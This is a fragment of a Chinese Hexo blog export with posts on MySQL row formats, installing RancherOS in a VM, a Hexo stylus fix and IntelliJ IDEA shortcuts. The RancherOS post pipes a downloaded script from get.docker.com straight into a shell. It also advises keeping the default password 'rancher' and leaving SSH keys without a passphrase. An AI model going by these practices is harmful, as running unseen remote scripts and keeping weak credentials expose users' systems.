TABLE时明确指定。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t2 (c1 <span class="built_in">INT</span>) ROW_FORMAT=COMPRESSED;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t1 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> (c2 <span class="built_in">INT</span>);</span><br></pre></td></tr></table></figure><p>如未指定<code>ROW_FORMAT</code>将使用<code>innodb_default_row_format</code>，也就是实际上会补充为<code>ROW_FORMAT=DEFAULT</code>。</p><p>使用<code>INFORMATION_SCHEMA.INNODB_TABLES</code>查询表信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_TABLES WHERE NAME LIKE &#39;test&#x2F;t1&#39; \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">     TABLE_ID: 54</span><br><span class="line">         NAME: test&#x2F;t1</span><br><span class="line">         FLAG: 33</span><br><span class="line">       N_COLS: 4</span><br><span class="line">        SPACE: 35</span><br><span class="line">   ROW_FORMAT: Dynamic</span><br><span class="line">ZIP_PAGE_SIZE: 0</span><br><span class="line">   SPACE_TYPE: Single</span><br></pre></td></tr></table></figure><h3 id="查看表的行格式"><a href="#查看表的行格式" class="headerlink" title="查看表的行格式"></a>查看表的行格式</h3><p>tbl_name 表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLE</span> <span class="keyword">STATUS</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'tbl_name%'</span>;</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> TABLE_NAME <span class="keyword">LIKE</span> <span class="string">'tbl_name%'</span>;</span><br></pre></td></tr></table></figure><h2 id="InnoDB最大表空间大小，表的最大大小"><a href="#InnoDB最大表空间大小，表的最大大小" class="headerlink" title="InnoDB最大表空间大小，表的最大大小"></a>InnoDB最大表空间大小，表的最大大小</h2><p><code>innodb_page_size</code>只能在初始化MySQL实例之前进行配置。默认的16KB页面大小或更大适用于各种工作负载，特别是涉及涉及批量更新的表扫描和DML操作的查询。</p><table><thead><tr><th>InnoDB页面大小</th><th>最大表空间大小</th></tr></thead><tbody><tr><td>4KB</td><td>16TB</td></tr><tr><td>8KB</td><td>32TB</td></tr><tr><td>16KB</td><td>64TB</td></tr><tr><td>32KB</td><td>128TB</td></tr><tr><td>64KB</td><td>256TB</td></tr></tbody></table><p>最大表空间大小也是表的最大大小。</p><p>MySQL客户端程序理论上连接时，默认使用<code>utf8mb4</code>。也可以直接使用<code>--default-character-set</code>指定。</p><p>参考链接:<br><a href="https://my.oschina.net/xsh1208/blog/1052781">全面了解mysql中utf8和utf8mb4的区别</a><br><a href="http://seanlook.com/2016/10/23/mysql-utf8mb4/">mysql使用utf8mb4经验吐血总结</a></p>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>utf8mb4</tag>
        <tag>MySQL字符集</tag>
        <tag>MySQL大小写</tag>
        <tag>MySQL尾部空格</tag>
        <tag>InnoDB default ROW_FORMAT</tag>
      </tags>
  </entry>
  <entry>
    <title>在VM中安装RancherOS使用Docker</title>
    <url>/2018/07/15/use-VM-install-RancherOS-for-docker/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker 有提供windows 下基于VirtualBox/Hyper-V的安装包。<br>已安装VirtualBox的安装Hyper-V版的可能会有问题。</p><p>已安装VM类软件的，并已有黑苹果、Linux环境的，可以直接安装docker。<br><code>curl -sSL https://get.docker.com/ | sh</code> <a href="https://blog.yanzhe.tk/2017/11/09/docker-set-proxy/">之前文章</a>有提到</p><p>如未安装其他系统，可以考虑使用RancherOS。</p><p>下面介绍使用VM安装RancherOS</p><p>这两天帮小伙伴在虚拟机上安装了<a href="https://github.com/rancher/os/releases/latest">RancherOS</a>，一个通过容器构建的简单Linux发行版。只有几十M的系统镜像。<br>在docker上安装docker，挺有意思的。系统内核启动的第一个进程，PID为1的是“System Docker”，它的工作就是初始化系统服务，所有的进程、服务等等都是通过一个个Docker实例来完成的，System Docker类似于其它linux发行版中Systemd比如ArchLinux。</p><h2 id="简要步骤"><a href="#简要步骤" class="headerlink" title="简要步骤"></a>简要步骤</h2><ul><li>测试网络</li><li>更改rancher密码</li><li>配置cloud-config.yml后安装系统到硬盘</li><li>从硬盘启动</li></ul><h2 id="VM安装RancherOS注意点"><a href="#VM安装RancherOS注意点" class="headerlink" title="VM安装RancherOS注意点"></a>VM安装RancherOS注意点</h2><blockquote><ul><li>VM给RancherOS分配的内存最好大于1G，可以分配到2G;</li><li>硬盘可以看使用分配。如需要使用的大，可以分配多点。但不建议低于5G。我和小伙伴们都分配的20G;</li><li>网络模式看自己情况选择，我们使用的桥接模式;</li><li>启动后用户名密码都是rancher;</li><li>现在把RancherOS默认为内存模式启动，需配置cloud-config.yml安装到硬盘，不然会无限重启，或从硬盘找不到系统。</li></ul></blockquote><h2 id="注意主机和VM的连通"><a href="#注意主机和VM的连通" class="headerlink" title="注意主机和VM的连通"></a>注意主机和VM的连通</h2><p>注意主机和VM之间能互相ping通。主要是主机能访问到VM的SSHD服务，默认端口为22。可以使用映射，映射到主机其他端口。</p><p>查看VM的IP地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip a | grep inet</span><br></pre></td></tr></table></figure><p><code>wlp3s0</code> 之类的为无线网卡的地址</p><p>在主机和VM互相使用ping命令测试连通。</p><p>测试SSHD服务，可以在主机上使用<code>telnet</code>或<code>putty</code>，<code>git bash</code>中的ssh，或是其他连接工具。</p><h2 id="使用秘钥对"><a href="#使用秘钥对" class="headerlink" title="使用秘钥对"></a>使用秘钥对</h2><p>使用已有的秘钥对，或是重新生成。<br>可以使用<code>puttygen.exe</code>，或是<code>ssh-keygen</code>命令重新生成。</p><h3 id="使用puttygen-exe生成密钥对简要步骤"><a href="#使用puttygen-exe生成密钥对简要步骤" class="headerlink" title="使用puttygen.exe生成密钥对简要步骤"></a>使用puttygen.exe生成密钥对简要步骤</h3><ul><li>运行puttygen.exe</li><li>点击 Generate 按钮生成密钥</li><li>留意下创建的是ssh-2 RSA 和2048bit内容的密钥(使用默认的也都行)</li><li>等待。可在进度条下的软件空白处，移动鼠标，能加快Gen速度</li><li>创建完成后，将显示Public key，可以自行修改Key Comment备注信息</li><li>导出公钥和私钥</li></ul><h3 id="使用ssh-keygen命令生成密钥对"><a href="#使用ssh-keygen命令生成密钥对" class="headerlink" title="使用ssh-keygen命令生成密钥对"></a>使用ssh-keygen命令生成密钥对</h3><p>在window上可以使用<code>Git Bash</code>，然后使用<code>ssh-keygen</code></p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b <span class="number">4096</span> -C <span class="string">"your_email@example.com"</span> -f ~/.ssh/id_rsa_rancheros</span><br><span class="line"><span class="comment"># Creates a new ssh key, using the provided email as a label</span></span><br><span class="line"><span class="comment"># Generating public/private rsa key pair.</span></span><br><span class="line">Enter <span class="built_in">file</span> <span class="keyword">in</span> which <span class="built_in">to</span> save <span class="keyword">the</span> key (/Users/you/.ssh/id_rsa): [Press enter] <span class="comment"> // 推荐使用默认地址</span></span><br><span class="line">Enter passphrase (<span class="literal">empty</span> <span class="keyword">for</span> no passphrase):  <span class="comment"> //此处点击 Enter 键即可，也可以填写密码，填写密码后每次使用 SSH 方式推送代码时都会要求输入密码，由于这个 Key 也不是用于军事目的，所以也无需设置密码。</span></span><br></pre></td></tr></table></figure><p>成功将显示<br>Your identification has been saved in /Users/you/.ssh/id_rsa.<br>Your public key has been saved in /Users/you/.ssh/id_rsa.pub.</p><p><strong>注意替换[<a href="mailto:your_email@example.com">your_email@example.com</a>]为自己的邮箱</strong></p><ul><li>-C　不使用，默认使用 当前用户名@主机名 的形式</li><li>-f　不指定，默认使用~/.ssh/id_rsa<pre><code>当然，也可以在提问保存地址时自行更改</code></pre></li></ul><h3 id="使用puttygen-exe生成ppk格式私钥"><a href="#使用puttygen-exe生成ppk格式私钥" class="headerlink" title="使用puttygen.exe生成ppk格式私钥"></a>使用puttygen.exe生成ppk格式私钥</h3><p>现在挺多软件基于putty的ppk格式密钥。所以如果是使用的<code>ssh-keygen</code>生成的密钥对，可以在<code>puttygen.exe</code>中导入生成的私钥，生成ppk格式私钥。</p><ul><li>运行puttygen.exe</li><li>点击Conversions菜单项中的Import key</li><li>选择生成的id_rsa文件</li><li>在puttygen.exe的界面上点击Save private key按钮就可以把私钥转换为ppk的格式了</li></ul><h2 id="使用命令行方式登录，可以配置config"><a href="#使用命令行方式登录，可以配置config" class="headerlink" title="使用命令行方式登录，可以配置config"></a>使用命令行方式登录，可以配置config</h2><p>在~/.ssh文件夹下，打开/创建 config 文件</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rancheros</span></span><br><span class="line">Host rancheros</span><br><span class="line">    HostName 192.168.23.178</span><br><span class="line">   <span class="built_in"> Port </span>22</span><br><span class="line">   <span class="built_in"> User </span>rancher</span><br><span class="line">	PreferredAuthentications publickey</span><br><span class="line">    IdentityFile  ~/.ssh/id_rsa_rancheros</span><br><span class="line">    IdentitiesOnly <span class="literal">yes</span></span><br></pre></td></tr></table></figure><p>HostName需替换为虚拟机IP地址<br>端口如映射为主机其他端口，也需更改，同时IP使用主机IP</p><h2 id="配置cloud-config-yml"><a href="#配置cloud-config-yml" class="headerlink" title="配置cloud-config.yml"></a>配置cloud-config.yml</h2><p>cloud-config.yml文件 <a href="cloud-config">自用</a>,改后缀为yml，即改文件名为<code>cloud-config.yml</code></p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">cloud-config</span><br><span class="line"></span><br><span class="line">rancher:</span><br><span class="line">  docker:</span><br><span class="line">    registry_mirror: https:<span class="comment">//registry.docker-cn.com</span></span><br><span class="line">  network:</span><br><span class="line">    #<span class="built_in">int</span>erfaces:</span><br><span class="line">    #    eth0:</span><br><span class="line">    #        address: <span class="number">192.168</span><span class="number">.1</span><span class="number">.188</span>/<span class="number">24</span></span><br><span class="line">    #        gateway: <span class="number">192.168</span><span class="number">.1</span><span class="number">.254</span></span><br><span class="line">    #        mtu: <span class="number">1500</span></span><br><span class="line">    #        dhcp: <span class="literal">false</span></span><br><span class="line">    dns:</span><br><span class="line">      nameservers:</span><br><span class="line">       - <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">       - <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">ssh_authorized_keys:</span><br><span class="line">  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNdwM2gpzBg71pwcylJEE65QsHWGoX5UASAbgNvR8pirUJbVhBENlTwyROgKPPGPtbcyuVAH2bIu3j3HtDxWBG1+fL2cMegd/<span class="number">4</span>X79emClufSBuquFH0ZgyRkUtxwVZxtLWkNi+U3GYPbvwXWZxmKQ63lmfD4/FH0ymkEteI0BPaQD5eq3gm0iRbZ/I/<span class="number">0543</span>iSn1LULVNTsdAzu34OO89VbCS4eGs3OVLZGvitQE7SECuoavze/GiuNp9DMxu8qnOxOaRv7tp0zi4fSLTXUpPRixqwaXlmpNXawEHzPRz1tqf2dtBWgKy2HLKqDbU6+vpE2oDmwTsxGw0rL4H9iELMovovDrDWoVR8ZFFNMjW++MLcRw0S9YWzu3Urp1wghRVgQC436HQduzBLFl7eqn7KNK08i1X56IUM88vuUdQON8QBwhhudXFef3AeAYDK8lf9kApetx2Xh4czHNSFauQgNPfmLaiKzLv8BBWhjLNo/<span class="number">1</span>I1HY400DAS/sZFXVJKEB/YnwbbgYah42cpS8AN2VgFmbq5UyOA/z8VkW0eBaVVia9XhgQDeLCyw/zsVJy09qwj7D9SkRy1OwoPPqKulAcbTfDw8Ayrw5kTmKF2oFUcv9hQXK1aAVOI1IGE5DJZql5nfuRcW097qCk+<span class="number">7</span>D2UWNKQm5ORKTzl0jYvQe9ajW7OZjw== <span class="symbol">rancher@</span>rancher</span><br><span class="line"># - ssh-rsa BBB...ZZZ <span class="symbol">example2@</span>rancher</span><br></pre></td></tr></table></figure><blockquote><ul><li>注意将<code>https://99nkhzdo.mirror.aliyuncs.com</code> 替换为自己的阿里云Docker镜像地址。</li><li>注意使用之前生成的公钥id_rsa_rancheros.pub中的内容替换BBB…ZZZ example2@rancher，同时去除#注释</li><li>如不能自动获取IP地址，将network下的#去除，同时，配置自己的address,gateway，与主机在同一网关</li><li>cloud-config.yml文件格式。注意文件缩进使用空格键，不要使用TAB键。</li><li>注意Linux文件换行。</li></ul></blockquote><h2 id="必须更改rancher密码"><a href="#必须更改rancher密码" class="headerlink" title="必须更改rancher密码"></a>必须更改rancher密码</h2><p>VM中使用更改rancher账户密码<br>注意启动之后默认的账号密码为rancher:rancher</p><p>默认密码可能不能使用SSH访问，必须进行一次修改密码，密码可仍使用rancher</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo passwd rancher</span></span><br></pre></td></tr></table></figure><p>输入密码rancher，确认密码rancher</p><p>切换到root用户</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -i</span></span><br></pre></td></tr></table></figure><h2 id="使用SFTP工具上传cloud-config-yml"><a href="#使用SFTP工具上传cloud-config-yml" class="headerlink" title="使用SFTP工具上传cloud-config.yml"></a>使用SFTP工具上传cloud-config.yml</h2><p>可以直接在VM中进行修改。<br>如在主机上进行修改，则需使用SFTP工具上传cloud-config.yml文件。</p><p>如使用PSFTP.EXE</p><ul><li>将cloud-config.yml拷入PSFTP.EXE同级目录</li><li>open 192.168.1.172 　连接上VMIP</li><li>put cloud-config.yml</li></ul><h2 id="安装RancherOS到硬盘，从硬盘启动"><a href="#安装RancherOS到硬盘，从硬盘启动" class="headerlink" title="安装RancherOS到硬盘，从硬盘启动"></a>安装RancherOS到硬盘，从硬盘启动</h2><p>如已调整启动顺序，优先从硬盘启动，是否重启选y，将自动重启。<br>未有调整，关机后，移除光驱，选择从硬盘启动，开机。然后使用ssh登录/或其他工具Putty、MobaXterm、XShell等登录。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo ros<span class="built_in"> config </span>validate -i cloud-config.yml </span><br><span class="line"><span class="comment">#验证cloud-config.yml文件是否正确</span></span><br><span class="line">sudo ros install -c cloud-config.yml -d /dev/sda</span><br><span class="line"></span><br><span class="line"><span class="comment">#提示是否继续，确认y</span></span><br><span class="line">y</span><br><span class="line"></span><br><span class="line"><span class="comment">#成功之后提示是否重启，不重启N</span></span><br><span class="line">N</span><br><span class="line"><span class="comment">#然后关机</span></span><br><span class="line">sudo poweroff</span><br></pre></td></tr></table></figure><p>一般为<code>/dev/sda</code>，如不对，可以使用以下命令自行查看本地磁盘</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">sudo fdisk -l <span class="string">| grep Disk</span></span><br></pre></td></tr></table></figure><h2 id="查看ros配置"><a href="#查看ros配置" class="headerlink" title="查看ros配置"></a>查看ros配置</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo ros<span class="built_in"> config </span>export</span><br></pre></td></tr></table></figure><h2 id="rancheros重启docker"><a href="#rancheros重启docker" class="headerlink" title="rancheros重启docker"></a>rancheros重启docker</h2><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">system</span>-docker <span class="built_in">restart</span> docker</span><br><span class="line">#或是</span><br><span class="line">sudo ros s <span class="built_in">restart</span> docker</span><br></pre></td></tr></table></figure><h2 id="补充-Putty配置ppk登录"><a href="#补充-Putty配置ppk登录" class="headerlink" title="补充:Putty配置ppk登录"></a>补充:Putty配置ppk登录</h2><ul><li>在putty中选中id_rsa_rancheros</li><li>一般放在C:\Users&lt;用户名&gt;.ssh</li><li>然后在session中登入</li></ul><p><img alt="putty配置ppk" data-src="putty_config_ppk.png"></p><p>其他界面工具类似，配置私钥/ppk格式私钥</p>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>RancherOS</tag>
        <tag>ssh-keygen</tag>
        <tag>ssh配置config简化命令行登录</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 版本3.0以下的坑爹，public中css文件不出来</title>
    <url>/2015/02/06/Hexo-%E7%89%88%E6%9C%AC3-0%E4%BB%A5%E4%B8%8B%E7%9A%84%E5%9D%91%E7%88%B9%EF%BC%8Cpublic%E4%B8%ADcss%E6%96%87%E4%BB%B6%E4%B8%8D%E5%87%BA%E6%9D%A5/</url>
    <content><![CDATA[<h1 id="无比的坑爹啊"><a href="#无比的坑爹啊" class="headerlink" title="无比的坑爹啊!"></a>无比的坑爹啊!</h1><p>Hexo版本使用的当下最新的2.8.3（因为才开始接触Hexo。菜鸟没办法啊），生成的页面版面一直都是乱的。以为是还有没加载上的。- -!直接在主题里面乱找。然后才想想，会不会有人跟我一样悲催。还真有<a href="http://gsgundam.com/2015-01-29-hexo-css-missing/">这位兄弟</a>。然后找到<a href="https://github.com/hexojs/hexo/issues/995">官方解释</a>，<br><strong>hexo-renderer-stylus is rewritten for Hexo 3.0</strong>.<br>所以3.0以前的版本要使用旧版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-renderer-stylus@0.1 --save</span><br></pre></td></tr></table></figure><p>搭建，自定义评论框，图床，网站加速，监控，统计功能(有如<a href="http://service.ibruce.info/">不蒜子</a>等)<br><a href="http://ibruce.info/2013/11/22/hexo-your-blog/">hexo你的博客</a></p><p>UPDATE : 2018-06-23 好久没管过hexo，今天升级hexo 后，遇坑无数</p><h3 id="当hexo-g-报错-Error-expected-end-of-comment-got-end-of-file"><a href="#当hexo-g-报错-Error-expected-end-of-comment-got-end-of-file" class="headerlink" title="当hexo g 报错 Error: expected end of comment, got end of file"></a>当hexo g 报错 Error: expected end of comment, got end of file</h3><p><code>grep {&#35; *.md -rn</code><br>找找md 文件中应该是含有 {&#35; ，需要修改为'{&#35;' ，或是使用三个<code>`</code> 符号包含起来</p><h3 id="当hexo-g-报错-mozjpeg-vendor-cjpeg-ENOENT-等"><a href="#当hexo-g-报错-mozjpeg-vendor-cjpeg-ENOENT-等" class="headerlink" title="当hexo g 报错 mozjpeg/vendor/cjpeg ENOENT 等"></a>当hexo g 报错 mozjpeg/vendor/cjpeg ENOENT 等</h3><p>缺少包安装啥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install autoconf libtool nasm wget automake gcc</span><br><span class="line">或</span><br><span class="line">yum install wget autoconf automake gcc nasm libtool</span><br></pre></td></tr></table></figure><p>然后，执行rebuild</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm rebuild mozjpeg  </span><br><span class="line">npm rebuild gifsicle  </span><br><span class="line">npm rebuild optipng-bin</span><br><span class="line">npm rebuild jpegtran-bin</span><br></pre></td></tr></table></figure><p>当然也是可以使用 cnpm</p><h3 id="使用Gitment-替代多说"><a href="#使用Gitment-替代多说" class="headerlink" title="使用Gitment 替代多说"></a>使用Gitment 替代多说</h3><p>使用 GitHub Issues 搭建评论系统<a href="https://imsun.net/posts/gitment-introduction/">gitment</a></p>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>IntelliJ IDEA 快捷键</title>
    <url>/2015/07/21/IntelliJ-IDEA-shortcuts/</url>
    <content><![CDATA[<p>关于IntelliJ IDEA快捷键分享给大家</p><p>##==Ctrl==</p><p>Ctrl + Y 删除行</p><p>ctrl + X 剪切行</p><p>Ctrl + N 查找类</p><p>Ctrl + R 替换</p><p>Ctrl + O 选择可覆盖/继承的方法</p><p>Ctrl + F 当前代码中查找</p><p>Ctrl + J 自动代码提示（提示的是自己定义的代码格式）</p><p>Ctrl + D 复制行或是块(默认是这个意思)(但是我一般习惯改成专门复制行,不包括块,搜索Duplicate Lines)</p><p>Ctrl + P 方法参数提示显示</p><p>Ctrl + W 选中光标所在的单词 ，连续按会有其他效果 (相反的是Ctrl+Shift+W)</p><p>Ctrl + Q 鼠标放在变量/类名/方法名等上面（也可以在提示补充的时候按），显示文档内容，同类似的功能还有一个Ctrl + Shift + I</p><p>Ctrl + B 快速打开光标处的类或方法（对于前端支持很好,比如可以直接通过class的name定位到css的文件位置）(等同于ctrl+光标指向)</p><p>Ctrl + E 最近打开的文件</p><p>Ctrl + U 前往父类的方法/父类</p><p>Ctrl + K VCS提交项目</p><p>Ctrl + T VCS更新项目</p><p>Ctrl + G 跳到指定行</p><p>Ctrl + H 显示类层次图</p><p>Ctrl + F1 显示错误</p><p>Ctrl + F3 调转到所选中的词的下一个同名位置</p><p>Ctrl + F9 编译</p><p>Ctrl – F12 当前编辑的文件中快速导航(可以直接键入字母，IntelliJ IDEA会筛选你输入的来匹配对应是否有的方法，来快速定位)(类似结构图)</p><p>Ctrl + F11 弹出一个小框来指定式添加书签(可以对文件或文件夹起作用)</p><p>Ctrl + Tab 编辑窗口切换 (如果在切换的过程又加按上delete,则是关闭对应选中的窗口)</p><p>Ctrl + delete 删除光标后面的单词</p><p>Ctrl + home/end 跳到文件头文件尾</p><p>Ctrl + BackSpace 删除光标前面的单词</p><p>Ctrl + [ 或 ] 移动光标到块的初/末括号地方</p><p>Ctrl + / 或 Ctrl+Shift+/ 注释（// 或者/<em>…</em>/ ）</p><p>Ctrl + 1，2，3，4…. 快速定位到书签代码处(必须先Ctrl+Shift+1,2,3,4…添加书签)</p><p>Ctrl + 空格 代码补全提示(因为windows默认被输入法给占用了,可以自己更改下)</p><p>Ctrl + 小键盘+/- 折叠/展开代码</p><p>Ctrl + 鼠标单击编辑窗口的文件标题 弹出该文件路径,可以通过这个打开文件所在地方(相当于Ctrl+alt+F12)</p><p>Ctrl + 方向左/右 光标跳到上/下个单词</p><p>Ctrl + 方向上/下 相当于你用鼠标滑滚轮(为了方便鼠标党)</p><p>==================================================</p><p>##==Alt==</p><p>Alt + 1 打开/关闭project选项卡</p><p>Alt + 这个键是Tab上面那个，按下之后，如果项目有版本控制，则显示常用的版本控制命令</p><p>Alt + A 在SVN中把新创建的文件加入进来（自己添加，在Subversion类别）</p><p>Alt + Q 查看方法的声明(在左上角出现一个Tip层提示)，你无需滚动上去查看</p><p>Alt + F1 弹出文件选择目标，这个很好用的</p><p>Alt + F2 多个浏览器预览</p><p>Alt + F3 选中文本，逐个往下查找相同文本，并高亮显示。</p><p>Alt + F7 查看该方法/变量/类被调用的地方</p><p>Alt + F8 在debug的状态下，选中某些变量或是对象，按此快捷键弹出可输入变量、方法的调试框，指定查看该内容的debug情况</p><p>Alt + Home 跳到文件导航bar</p><p>Alt + Insert 生成代码(如get,set方法,构造函数等)</p><p>Alt + 方向键 左 或 方向键 右 切换当前打开的代码文件视图</p><p>Alt + 方向键 上 或 方向键 下 在方法间快速移动定位</p><p>Alt + 鼠标左键单击不放,拖动 可以直接方块区域选择（很有用）</p><p>Alt + 回车 快速修复(可以用来导入单个包)</p><p>==================================================</p><p>##==Shift==</p><p>Shift + F6 重构：重新命名</p><p>Shift + F11 查看书签</p><p>Shift + F10 Run(运行)当前程序，相当于点击run按钮</p><p>Shift + F9 debug当前程序，相当于点击debug按钮</p><p>Shift + end 选中从光标到end处</p><p>Shift + home 选中从光标到home处</p><p>Shift + Enter 光标所在行下空出一行，光标跳下</p><p>Shift + 单击 可以关闭文件</p><p>Shift + 滚轮 横向滚动轴滚动(非常强大)</p><p>==================================================</p><p>##==Ctrl+Alt==</p><p>Ctrl + Alt + W 关闭所有编辑的快捷键（自己添加，在close all）</p><p>Ctrl + Alt + O 优化导入的类和包</p><p>Ctrl + Alt + L 格式化代码</p><p>Ctrl + Alt + I 选中部分自动缩进行（有点类似格式化，但是只是整理行格式而已）</p><p>Ctrl + Alt + T 选中的地方代码环绕提示</p><p>Ctrl + Alt + B 跳到具体的实现方法，查找接口/抽象方法的具体实现很好用(相反行为的快捷键是Ctrl+b)</p><p>Ctrl + Alt + V 快速引进一个变量</p><p>Ctrl + Alt + F7 寻找被该类或是变量被使用的地方，用弹出框的方式找出来，跟Alt+F7效果一样，但是因为是弹出框，选中了一个位置就会消失。</p><p>Ctrl + Alt + Enter 光标所在行上空出一行，光标跳上</p><p>Ctrl + Alt + home 弹出跟当前文件有关联的文件目录(比如jsp里面有导入几个js和css,这些文件就是关联文件)</p><p>Ctrl + Alt + 方向左/右 退回/前进到上一个操作的地方</p><p>Ctrl + Alt + 方向上/下 在Find模式下，挑到上/下个查找的文件</p><p>Ctrl + Alt + 空格 类名或接口名提示(最常用的,一般敲入字母都会提示,但是如果你不小心esc了,可以再按这个出来)</p><p>==================================================</p><p>##==Ctrl+Shift==</p><p>Ctrl + Shift + F 查找文件（通过某个词，指定要搜索的文件类型，目录（跟myeclipse中的ctrl+H功能一样））</p><p>Ctrl + Shift + U // 大/小写都是这个快捷键</p><p>Ctrl + Shift + V 粘贴最近复制过的一些信息</p><p>Ctrl + Shift + Z ，取消撤销（恢复上一次操作）</p><p>Ctrl + Shift + T 如果在常规类下按它，弹出已写好的，可选择的对应Test类，如果在该Test类下按它，则直接回到源类。</p><p>Ctrl + Shift + C 复制当前文件磁盘路径到剪贴板</p><p>Ctrl + Shift + J 自动将下一行合并到当前行末尾</p><p>Ctrl + Shift + E 最近更改的文件</p><p>Ctrl + Shift + I 在方法名或是类名下(或是代码补充提示的时候也可以按，也可以在图片地址上按)，按此快捷键显示该方法或是类的源码结构，无需点击进去查看源码（当然了，必须是你已经导入源码的情况下才看得到） 类似Ctrl+Q</p><p>Ctrl + Shift + R 搜索指定范围文件，替换文字</p><p>Ctrl + Shift + N 通过输入文件名（可以输入部分名称，支持模糊）来定位文件</p><p>Ctrl + Shift + F12 编辑器全屏</p><p>Ctrl + Shift + F7 高亮显示所有该选中文本，按Esc高亮消失。(也可以在throws或是try..catch上面按此快捷键，比如在一个方法的throws单词上按这个快捷键，则会把哪些内部方法会抛异常的都显出来)</p><p>Ctrl + Shift + Del 删除环绕的标签</p><p>Ctrl + Shift + 1，2，3… 快速添加书签</p><p>Ctrl + Shift + Space 自动补全代码（智能提示）</p><p>Ctrl + Shift + Enter 行末自动添加 ; 结束代码 ，如果是输入if，按这个快捷键会自动帮你补充(){}</p><p>Ctrl + Shift + Enter 自动给末尾加;完成代码</p><p>Ctrl + Shift + Up 或 Down 移动光标所在statement域移动到上面/下面(13版本会自动格式化)(如果光标放在方法名上 ， 是互换方法位置,如果是打开tool界面，且是竖直方向布局，则根据方向调整窗口大小)</p><p>Ctrl + Shift + Left 或 Right 打开tool界面，如果是横向布局，则根据左右方向调整窗口大小)</p><p>Ctrl + Shift + [ 或 ] 选中从光标所在位置到它的父级区域(界面上层导航可能更开)</p><p>Ctrl + Shift + 小键盘 + 或 – 折叠/展开所有代码</p><p>Ctrl + Shift + 空格 代码补全功能(最常用的,一般敲入字母都会提示,但是如果你不小心esc了,可以再按这个出来)</p><p>Ctrl + Shift + 方向左 或 右 选中临边左/右的单词或是符号</p><p>Ctrl + Shift + Backspace(退格) 回到上次修改的地方(跟Ctrl+Alt+左右方向键不一样的地方是，只回退到修改的地方，而不是过去光标放的地方)</p><p>==================================================</p><p>##==Alt+Shift==</p><p>Alt + Shift + N 添加任务</p><p>Alt + Shirt + F 添加到收藏夹</p><p>Alt + Shift + C 查看最近操作项目的变化情况列表(在版本控制下，显示比较缓慢)</p><p>Alt + Shift + F10 弹出run菜单，提供选择性run哪个(这个需要自己尝试下，按后会有弹出框，记得查看)</p><p>Alt + Shift + F9 弹出debug运行菜单，提供选择性debug哪个(这个需要自己尝试下，按后会有弹出框，记得查看)</p><p>Alt + Shift + 方向键 上 或 方向键 下 移动光标所在行到上/下</p><p>==================================================</p><p>##==Ctrl+Shift+Alt==</p><p>Ctrl + Shift + Alt + V 简单黏贴</p><p>Ctrl + Shift + Alt + N 查找类中的方法或变量</p><p>Ctrl + Shift + Alt + C 复制参考信息，比如在某个方法名上按此快捷键，得到的内容是：org.jfree.data.general.DefaultPieDataset#setValue(java.lang.Comparable, double)里面有包名，类名，方法名，方法变量</p><p>==================================================</p><p>##==其他==</p><p>如syso（sout Tab键）main（psvm Tab键）</p><p>F11 添加书签</p><p>F4 光标放在哪里(即使是一个路径的URL的一小部分都可以)跳到这个路径下的位置,从IntelliJ IDEA的左侧web窗口打开</p><p>F2 或 Shift+F2 高亮错误或警告快速定位(在代码有报错的情况下)</p><p>代码标签输入完成后，按Tab，生成代码。</p><p>在Ctrl+F查找模式下，按F3下一个点</p><p>在debug模式下，F8下一步，F9下一个断点</p><p>更改下移的快捷 搜索down</p><p>Ctrl+鼠标单击编辑窗口的文件标题,弹出该文件路径,可以通过这个打开文件所在地方</p><p>按TAB+拖动代码标签，可以分开IntelliJ IDEA成多个</p>]]></content>
      <tags>
        <tag>IDE</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下统计当前文件夹下的文件个数、目录个数</title>
    <url>/2015/11/27/Linux-count-files-under-current-directory/</url>
